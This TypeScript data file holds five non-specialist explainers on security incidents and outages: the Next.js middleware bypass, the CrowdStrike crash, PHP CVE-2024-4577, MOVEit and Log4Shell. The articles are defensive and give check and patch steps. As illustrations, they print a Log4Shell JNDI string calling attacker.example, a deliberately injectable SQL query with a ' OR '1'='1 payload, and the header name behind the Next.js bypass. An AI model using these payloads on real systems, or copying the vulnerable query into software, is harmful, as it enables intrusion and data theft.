import type { Article } from "./articles";

// Explainers on well-known incidents, written for non-specialists. Newest incident first.
export const incidents: Article[] = [
  {
    slug: "nextjs-middleware-auth-bypass",
    title: "The Next.js middleware bypass (CVE-2025-29927): why one login check isn't enough",
    metaTitle: "Next.js Middleware Bypass Explained",
    summary:
      "In 2025 a single header could skip Next.js middleware, and the login checks inside it. What happened and how to stop one failure opening every door.",
    category: "Vulnerability",
    date: "2026-11-05",
    readMinutes: 7,
    source: { label: "NVD: CVE-2025-29927", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-29927" },
    faq: [
      {
        q: "Was every Next.js site affected?",
        a: "No. The problem hit self-hosted apps that ran with `next start` (or a standalone build) and used middleware for checks. Sites on some managed platforms were protected at the platform level, and fully static exports don't run middleware at all.",
      },
      {
        q: "I've upgraded. Do I need to do anything else?",
        a: "Upgrading closes this specific hole. The bigger fix is making sure your sensitive pages and data don't depend on middleware alone, so the next surprise can't expose them.",
      },
      {
        q: "How do I know if my app was exploited?",
        a: "Look in your access logs for requests carrying an `x-middleware-subrequest` header, and for visits to protected pages with no matching login. If your logs don't record headers, assume you can't be certain and review what was reachable.",
      },
    ],
    body: [
      { type: "p", text: "Picture a building with a security guard at the front door and nothing but open plan inside. As long as the guard is there, it works. Then one day someone finds out that saying a particular phrase makes the guard walk off, and suddenly every room is open." },
      { type: "p", text: "That, roughly, is what happened to a lot of Next.js apps in March 2025." },

      { type: "h", text: "What actually happened" },
      { type: "p", text: "Next.js has a feature called middleware: a bit of code that runs before a request reaches your page. Teams use it for redirects, language routing and, very often, login checks. \"If there's no session, send them to /login.\"" },
      { type: "p", text: "Inside the framework, middleware sometimes triggers more middleware, and Next.js uses an internal header called `x-middleware-subrequest` to keep track and avoid endless loops. The flaw, tracked as CVE-2025-29927, was that the framework trusted that header even when it came from an outside visitor. Send a request with the right value in it and Next.js decided middleware had already run, so it skipped it." },
      { type: "p", text: "If your only protection for `/admin` lived in middleware, the protection simply didn't happen. No password guessing, no clever exploit chain. One extra header." },
      { type: "p", text: "The fix shipped in patched versions across the supported lines, including 15.2.3, 14.2.25, 13.5.9 and 12.3.5. It was rated critical." },

      { type: "h", text: "Who was actually at risk" },
      { type: "ul", items: [
        "**Self-hosted apps** running the Node server (`next start`, or the standalone output), where Next.js itself handles each request.",
        "**Apps relying on middleware for authorisation**, not just cosmetic redirects.",
        "**Not affected:** static exports, which don't execute middleware, and apps on platforms that blocked the header before it reached your code.",
      ] },

      { type: "h", text: "How to check your own app" },
      { type: "ol", items: [
        "**Find your version.** Run `npm ls next` (or check `package.json` and your lockfile). Compare it with the patched releases above.",
        "**Search for middleware.** Look for a `middleware.ts` or `middleware.js` file in your project root or `src` folder. No file, no exposure to this particular bug.",
        "**Read what it protects.** If it's guarding dashboards, admin areas or API routes, those were open on any unpatched version.",
        "**Check your logs.** Look for the `x-middleware-subrequest` header in requests, if you record headers.",
      ] },

      { type: "h", text: "What to do about it" },
      { type: "h3", text: "Upgrade" },
      { type: "p", text: "Move to a patched release of your line. It's the real fix. If you can't upgrade immediately, stop that header at the edge, before it reaches the app. In Nginx, for example:" },
      { type: "code", text: "location / {\n    proxy_pass http://127.0.0.1:3000;\n    proxy_set_header x-middleware-subrequest \"\";\n}" },
      { type: "h3", text: "Check authorisation where the data lives" },
      { type: "p", text: "This is the lesson that outlasts the bug. Middleware is a convenient first filter, but it shouldn't be the only one. Put the real check next to the thing being protected, so it holds even if something upstream is skipped:" },
      { type: "code", text: "export async function getInvoices() {\n  const session = await getSession(); // your own session helper\n  if (!session) throw new Error(\"Not signed in\");\n\n  return db.invoice.findMany({ where: { userId: session.userId } });\n}" },
      { type: "p", text: "Now the invoices can't leave the database for someone who isn't signed in, whichever route they came by." },
      { type: "h3", text: "Test from the outside" },
      { type: "p", text: "Open a private window, so you're logged out, and visit your protected URLs directly. Try the API routes too. Doing this after every release takes two minutes and catches a surprising number of problems." },

      { type: "h", text: "The bigger takeaway" },
      { type: "p", text: "Security people call this defence in depth, which is a grand name for a simple habit: don't let one thing be the only thing. One login check, one firewall rule or one plugin shouldn't be the sole reason your private data stays private. Ask of any protection you have, \"What happens if this quietly stops working?\"" },
      { type: "p", text: "Also notice how this was fixed. Keeping your framework current isn't glamorous, but it's the cheapest protection you'll ever buy. Our [website and app security checklist](/news/website-security-checklist) has the rest of the routine, and if you'd like someone to test your protected pages from the outside, that's part of our audit." },
    ],
  },

  {
    slug: "crowdstrike-outage-2024",
    title: "The CrowdStrike outage of July 2024, explained for small teams",
    metaTitle: "CrowdStrike Outage Lessons for Small Teams",
    summary:
      "A faulty update crashed millions of Windows machines in July 2024. It wasn't a hack, and the lessons on releases and rollbacks apply to any team.",
    category: "Outage",
    date: "2026-11-05",
    readMinutes: 7,
    faq: [
      {
        q: "Was the CrowdStrike outage a cyberattack?",
        a: "No. It was caused by a faulty content update that CrowdStrike pushed to its own security software. There was no attacker involved.",
      },
      {
        q: "Could something like this happen to a small business?",
        a: "Yes, on a smaller scale. A bad deploy, a broken dependency update or an expired certificate can stop your sign-ups or checkout just as effectively, and often for longer because nobody is watching.",
      },
      {
        q: "What's the cheapest protection against a bad release?",
        a: "Release to a small slice of users first, watch your key flows, and keep a rollback you've actually tested. None of that needs an enterprise budget.",
      },
    ],
    body: [
      { type: "p", text: "Early on Friday 19 July 2024, people around the world started seeing the same thing: a blue screen, a restart, another blue screen. Airport departure boards went dark. Hospitals postponed procedures. Shops couldn't take card payments. Nobody had been hacked. A security company had sent out an update and, in doing so, broke the computers it was meant to protect." },

      { type: "h", text: "What happened, in plain English" },
      { type: "p", text: "CrowdStrike makes security software called Falcon, which runs deep inside Windows so it can spot threats. To keep up with new threats, it regularly sends out small data updates, which it calls content updates. One of these, for a component known as a channel file, contained data that the software wasn't prepared for." },
      { type: "p", text: "CrowdStrike's later review described a mismatch in the number of values the update supplied compared with what the code expected. Because Falcon runs at such a low level, the mistake didn't just crash the program. It crashed Windows itself, and the machines then crashed again every time they restarted." },
      { type: "p", text: "Microsoft estimated that about 8.5 million Windows devices were affected. That's a small share of all Windows machines, but they were concentrated in places where downtime hurts: airlines, banks, healthcare and retail." },
      { type: "p", text: "The fix was simple on paper and miserable in practice. Someone had to start each affected machine in a recovery mode and delete one file. With thousands of computers, many of them in locked-down or remote locations, that took days." },

      { type: "h", text: "Why it's relevant even if you've never heard of Falcon" },
      { type: "p", text: "The root problem wasn't unusual software. It was a familiar shape: a change that reached everyone at once, with no easy way back. You can build exactly that on a much smaller scale without noticing." },
      { type: "ul", items: [
        "A deploy on a Friday afternoon that changes the checkout and goes live to every customer immediately.",
        "A plugin or library auto-update that quietly breaks the contact form.",
        "An expired certificate or domain that takes the whole site down overnight.",
        "A third-party service you depend on changing something without warning.",
      ] },
      { type: "p", text: "The effect on your customers is the same: they can't buy, book or log in, and they don't care whose fault it was." },

      { type: "h", text: "What to put in place" },
      { type: "h3", text: "Release to a few people first" },
      { type: "p", text: "Roll changes out to a small share of users or a test group, watch what happens, then widen. CrowdStrike committed to staged rollouts after the incident, which tells you how valuable the idea is. Even a simple version helps: ship to a staging copy, click through the main flows, then go live." },
      { type: "h3", text: "Have a rollback you've actually tried" },
      { type: "p", text: "\"We can roll back\" is only true if someone has done it recently. Practise once on a quiet afternoon. Note how long it takes and what breaks." },
      { type: "h3", text: "Watch the flows that make you money" },
      { type: "p", text: "Server uptime isn't enough. A site can be \"up\" while the checkout button does nothing. Set up a simple check that goes through sign-up or checkout on a schedule and alerts you when it fails." },
      { type: "h3", text: "Know your dependencies" },
      { type: "p", text: "List the outside services and software your business can't run without, and for each one, ask what you'd do if it failed for a day. Sometimes the answer is \"nothing\", and that's worth knowing before it happens." },
      { type: "h3", text: "Decide how you'd tell customers" },
      { type: "p", text: "A short, honest status message posted quickly beats silence. Have a place to put it, and a person responsible for writing it." },

      { type: "h", text: "The takeaway" },
      { type: "p", text: "Outages are rarely caused by anything exotic. They tend to come from ordinary changes made without a safety net. If you'd like to see how your own site behaves on real phones and browsers, and where it might trip customers up, that's what our audit looks at. Our [security checklist](/news/website-security-checklist) covers the backups and recovery side." },
    ],
  },

  {
    slug: "php-cgi-cve-2024-4577",
    title: "PHP CVE-2024-4577 explained: the Windows flaw that let attackers run code",
    metaTitle: "PHP CVE-2024-4577 Explained",
    summary:
      "A Windows character-conversion quirk made PHP in CGI mode open to remote code execution in 2024. What it was and how to check your server.",
    category: "PHP",
    date: "2026-11-05",
    readMinutes: 6,
    source: { label: "NVD: CVE-2024-4577", url: "https://nvd.nist.gov/vuln/detail/CVE-2024-4577" },
    faq: [
      {
        q: "Does CVE-2024-4577 affect PHP on Linux?",
        a: "No. It's specific to Windows, where the way characters are converted lets a special character slip past a protection. Linux servers weren't vulnerable to this particular bug.",
      },
      {
        q: "I use PHP-FPM or mod_php. Am I affected?",
        a: "Not by this flaw. It needed PHP to run in CGI mode. Many setups use PHP-FPM or Apache's module instead, but it's worth confirming rather than assuming.",
      },
      {
        q: "Is it enough to update PHP?",
        a: "Updating to a patched release fixes it. Also retire unsupported versions, because they never received the fix, and consider moving off CGI mode entirely.",
      },
    ],
    body: [
      { type: "p", text: "Some security flaws need years of research to find. This one came from an old problem that people thought was solved, coming back through a side door." },

      { type: "h", text: "The short version" },
      { type: "p", text: "In June 2024, PHP released fixes for CVE-2024-4577. The bug let a stranger send a specially crafted web request to a Windows server running PHP in CGI mode and make it run commands of their choosing. The researcher who reported it, Orange Tsai of DEVCORE, found that an earlier fix from 2012 could be bypassed, and the severity was rated critical." },

      { type: "h", text: "How it worked, without the jargon" },
      { type: "p", text: "In CGI mode, a web server hands requests to the PHP program, and the text in the web address can end up as options for it. That's risky, because an attacker could smuggle in a setting that makes PHP run code taken from the request itself. Years ago (the original issue dates from 2012), PHP added a safeguard to block exactly that." },
      { type: "p", text: "The weakness was on the Windows side. Windows has a feature that automatically converts characters it doesn't recognise into the \"closest match\", known as best-fit mapping. In some regional language settings, a particular harmless-looking character was converted into a plain hyphen at the last moment. PHP's safeguard checked for hyphens before that conversion happened, so the disguised one sailed past, and then turned into a real option." },
      { type: "p", text: "The result: an attacker could, in effect, tell your server to run their code, from outside, with no login." },

      { type: "h", text: "How quickly it was abused" },
      { type: "p", text: "Once details were public, criminals moved fast. Security firms reported scanning and exploitation attempts within days of the disclosure, and some groups used it to deploy ransomware. This pattern is normal now: when a serious flaw is announced, assume that automated tools will be hunting for it almost immediately, so there's little time to \"get round to it\"." },

      { type: "h", text: "Who was exposed" },
      { type: "ul", items: [
        "**Windows servers** running PHP through CGI. Some bundled setups, such as certain XAMPP installs, used this by default.",
        "**Unpatched releases** of the 8.1, 8.2 and 8.3 lines. The fixed versions were 8.1.29, 8.2.20 and 8.3.8.",
        "**Unsupported versions** (8.0 and older) were also affected and never received a fix, so the only answer is to upgrade.",
        "**Not affected:** Linux servers, and setups using PHP-FPM or Apache's module rather than CGI.",
      ] },

      { type: "h", text: "How to check your server" },
      { type: "ol", items: [
        "**Which operating system?** If it's Linux, this specific flaw doesn't apply. Windows, keep going.",
        "**Which PHP version?** Run `php -v` and compare it with the fixed versions above, or with the newest release of your line.",
        "**How does PHP run?** Look at your web server config. A handler that points at `php-cgi.exe` means CGI mode. A reference to FastCGI/PHP-FPM or an Apache module means a different setup.",
        "**Is the version still supported?** Check the official [supported versions](https://www.php.net/supported-versions.php) page. If it's listed as end of life, plan an upgrade.",
        "**Look at the logs.** Odd requests with unusual query strings starting with a hyphen or containing encoded characters around the time of disclosure deserve a closer look.",
      ] },

      { type: "h", text: "What to do" },
      { type: "ul", items: [
        "Update PHP to a current, supported release.",
        "Move away from CGI mode to FastCGI or PHP-FPM if you can. It's both safer and faster.",
        "Keep the PHP and web server software in a patch routine, not an \"if we remember\" routine.",
        "If you were exposed and unpatched during that period, have someone check for signs of compromise: unfamiliar files, new accounts, odd scheduled tasks.",
      ] },
      { type: "p", text: "Strange errors from PHP on your site can be another clue to an unhealthy setup. Our guide to [common PHP errors](/news/fix-common-php-errors) shows what the messages mean, and the [security checklist](/news/website-security-checklist) covers keeping software current. Unsure whether your server is exposed? Checking exactly this is part of our audit." },
    ],
  },

  {
    slug: "moveit-transfer-breach",
    title: "The MOVEit breach explained: how one SQL injection exposed so many organisations",
    metaTitle: "MOVEit Breach and SQL Injection Explained",
    summary:
      "In 2023 attackers used a SQL injection flaw in MOVEit Transfer to steal data from huge numbers of organisations. What it is and how to prevent it.",
    category: "Hack",
    date: "2026-11-05",
    readMinutes: 7,
    source: { label: "NVD: CVE-2023-34362", url: "https://nvd.nist.gov/vuln/detail/CVE-2023-34362" },
    faq: [
      {
        q: "What is a SQL injection in simple terms?",
        a: "It's when text typed into a form or web address gets treated as part of a database command instead of as plain data. That lets an attacker change what the database does.",
      },
      {
        q: "Can SQL injection still happen with modern frameworks?",
        a: "Yes. Frameworks help a lot, but raw queries, search filters and custom reports still get written by hand, and any one of them can be vulnerable. It's worth checking each place user input meets the database.",
      },
      {
        q: "If a vendor gets hacked, is my business still responsible?",
        a: "Often, yes, at least in the eyes of customers and regulators. Whose fault it was matters less than what data you handed over and how long you kept it.",
      },
    ],
    body: [
      { type: "p", text: "SQL injection is almost older than some of the people now being asked to defend against it. It was described publicly in the late 1990s. And yet, in the spring of 2023, it was the way into one of the largest data thefts of the year." },

      { type: "h", text: "What happened" },
      { type: "p", text: "MOVEit Transfer is software that organisations use to send and receive sensitive files: payroll data, medical records, financial documents. Around the end of May 2023, attackers began exploiting a previously unknown SQL injection flaw in its web application, later tracked as CVE-2023-34362." },
      { type: "p", text: "The vendor, Progress Software, disclosed the problem on 31 May. The attackers, a ransomware group known as Cl0p, were not locking anyone's systems. They quietly took the files stored in the product, then went to each victim and demanded payment to keep the data off the internet. Further related flaws were discovered afterwards as the product was examined more closely." },
      { type: "p", text: "Because so many organisations used the same product, the damage spread widely. Early reports spoke of hundreds of organisations, and later tallies counted far more, along with tens of millions of individuals whose information was involved. Many of those people had never heard of MOVEit. Their data was held by a company that used it, or by the supplier of that company." },

      { type: "h", text: "SQL injection, explained properly" },
      { type: "p", text: "Most web apps talk to a database, and they do it by building a command from pieces. Part of the command is fixed, and part comes from whatever the visitor typed. The trouble starts when the typed part isn't kept separate. Here's the risky version in PHP:" },
      { type: "code", text: "// Risky: whatever the visitor types becomes part of the command\n$sql = \"SELECT * FROM orders WHERE email = '\" . $_GET['email'] . \"'\";" },
      { type: "p", text: "If someone types a normal email address, it works. If they type something like `' OR '1'='1`, they've changed the meaning of the command, and now it returns every order instead of one. With a little more effort, an attacker can read other tables, change records or, in the worst cases, take over the server." },
      { type: "p", text: "The fix is called a parameterised query. You send the command and the values separately, so the database always treats the value as data and never as instructions:" },
      { type: "code", text: "// Safer: the value travels separately from the command\n$stmt = $pdo->prepare('SELECT * FROM orders WHERE email = :email');\n$stmt->execute(['email' => $_GET['email']]);" },

      { type: "h", text: "What to do in your own app" },
      { type: "ol", items: [
        "**Use parameterised queries everywhere**, or an established ORM that does it for you. Never join user input into a query string.",
        "**Look for the exceptions.** Raw queries, hand-written search filters, sort options and reporting pages are where unsafe code hides. Search your code for places that build queries from strings.",
        "**Limit what the database account can do.** The app's database user usually doesn't need permission to drop tables or read everything. Smaller permissions mean a smaller blast radius.",
        "**Validate input** for type and length as a second layer. It won't replace parameterised queries, but it helps.",
        "**Test it.** Try odd characters such as a single quote in your search boxes and forms. A database error on screen is a warning sign worth a developer's attention.",
      ] },

      { type: "h", text: "The part that applies to everyone: your suppliers" },
      { type: "p", text: "Even if your code is spotless, tools you rely on may not be. A few habits make a real difference:" },
      { type: "ul", items: [
        "**Keep an inventory** of the software and services that hold or process your customers' data.",
        "**Apply security updates quickly,** especially for anything reachable from the internet.",
        "**Don't keep data you no longer need.** Files sitting in a transfer tool for years are files that can be stolen years later.",
        "**Know your plan** for when a supplier tells you they've been breached: who to contact, what to check, what you'll tell customers.",
      ] },
      { type: "p", text: "Spotting unsafe queries and forgotten data is exactly the sort of thing a review of your live app can find. Our [security checklist](/news/website-security-checklist) has the basics, and an audit goes into the parts a checklist can't reach." },
    ],
  },

  {
    slug: "log4shell",
    title: "Log4Shell explained: what happened and how to check your own software",
    metaTitle: "Log4Shell Explained: What to Check",
    summary:
      "In 2021 a flaw in a popular Java logging library let attackers run code by getting a server to log a string. The lesson: know what's in your software.",
    category: "Vulnerability",
    date: "2026-11-05",
    readMinutes: 7,
    source: { label: "NVD: CVE-2021-44228", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
    faq: [
      {
        q: "Does Log4Shell affect PHP or Node.js websites?",
        a: "Not directly, because Log4j is a Java library. But Java may still be running somewhere behind your site, such as a search server, an analytics tool or a vendor product, so it's worth asking.",
      },
      {
        q: "How do I know if I use Log4j?",
        a: "Ask your developers and vendors, and check Java projects with their dependency tools. Searching servers for `log4j-core` jar files is a good second check, since it can hide inside other products.",
      },
      {
        q: "Is Log4Shell still a risk today?",
        a: "Patched versions have been available since December 2021, but old, forgotten systems still turn up. The risk now is mostly in software nobody realised was running.",
      },
    ],
    body: [
      { type: "p", text: "For a few days in December 2021, a surprising number of IT teams worked through the weekend. The reason was a line of text. Written into a log file by an ordinary program, it could hand an outsider control of the server." },

      { type: "h", text: "What Log4j is, and why it was everywhere" },
      { type: "p", text: "When a program runs, it writes notes about what it's doing, such as logins, errors and warnings. That's logging. Apache Log4j 2 is a popular library that handles it for programs written in Java. Developers loved it because it was free, reliable, and flexible, so it ended up inside an enormous number of products: websites, business software, games, cloud services, even some appliances." },

      { type: "h", text: "What went wrong" },
      { type: "p", text: "Log4j had a feature that let a log message contain small instructions that the library would carry out before writing the message. One of those instructions could reach out across the network and load something from another server." },
      { type: "p", text: "That's convenient for developers and a gift to attackers, because a lot of what programs log comes straight from the outside world: usernames, search terms, browser details sent with every visit. An attacker only needed to get a crafted string into any of those. It looked like this (with a placeholder address):" },
      { type: "code", text: "${jndi:ldap://attacker.example/a}" },
      { type: "p", text: "When the server logged that text, Log4j obeyed it, fetched whatever the attacker's server offered, and ran it. No password and no prior access were needed. The flaw, CVE-2021-44228, was publicly disclosed on 9 December 2021, was given the top severity score of 10, and got the name Log4Shell. The researcher who first reported it to Apache was from Alibaba's cloud security team." },
      { type: "p", text: "Fixes came quickly, with the first in version 2.15.0, but follow-up releases (2.16.0 and then 2.17.0) were needed as more weaknesses were found in the same area. Attackers were scanning for vulnerable systems within hours." },

      { type: "h", text: "The real problem: nobody knew what they were running" },
      { type: "p", text: "Fixing Log4j was usually the easy part. The hard part was finding it. Many organisations discovered that the library was buried inside products from other companies, inside other libraries, or inside systems that nobody had looked at in years. Teams spent days just answering the question \"do we use this?\"" },
      { type: "p", text: "That is the lesson worth taking away from Log4Shell, whatever language your own site is written in. If you can't list what's inside your software, you can't say whether the next big flaw affects you." },

      { type: "h", text: "How to check your own software" },
      { type: "ol", items: [
        "**Ask.** Your developers and vendors can tell you whether anything you run uses Java and Log4j. For hosted products, ask the supplier directly.",
        "**Check Java projects.** For Maven, run `mvn dependency:tree` and look for `log4j`. For Gradle, `gradle dependencies` does the same job.",
        "**Search servers for the files.** Look for `log4j-core` jar files, including ones tucked inside other archives.",
        "**Check the version.** Anything older than the patched releases needs updating. Aim for the latest 2.x release rather than the first fix.",
        "**Review logs from December 2021** (and since) for strings starting with `${jndi:` if the system was exposed and unpatched.",
      ] },

      { type: "h", text: "Make the next one painless" },
      { type: "ul", items: [
        "**Keep a simple inventory:** each app, its main libraries and versions, and who looks after it. A spreadsheet is a good start.",
        "**Turn on automatic alerts** for vulnerable dependencies. GitHub's Dependabot and similar tools do this for free on many projects.",
        "**Remove what you don't use.** Every unused library is something that can break or be attacked.",
        "**Keep things patched on a routine,** not only when the news makes it feel urgent.",
      ] },
      { type: "p", text: "None of this needs to be complicated. The checklist in our [security guide](/news/website-security-checklist) puts the inventory step first for exactly this reason, and an audit of your app will list the outdated components it finds." },
    ],
  },
];
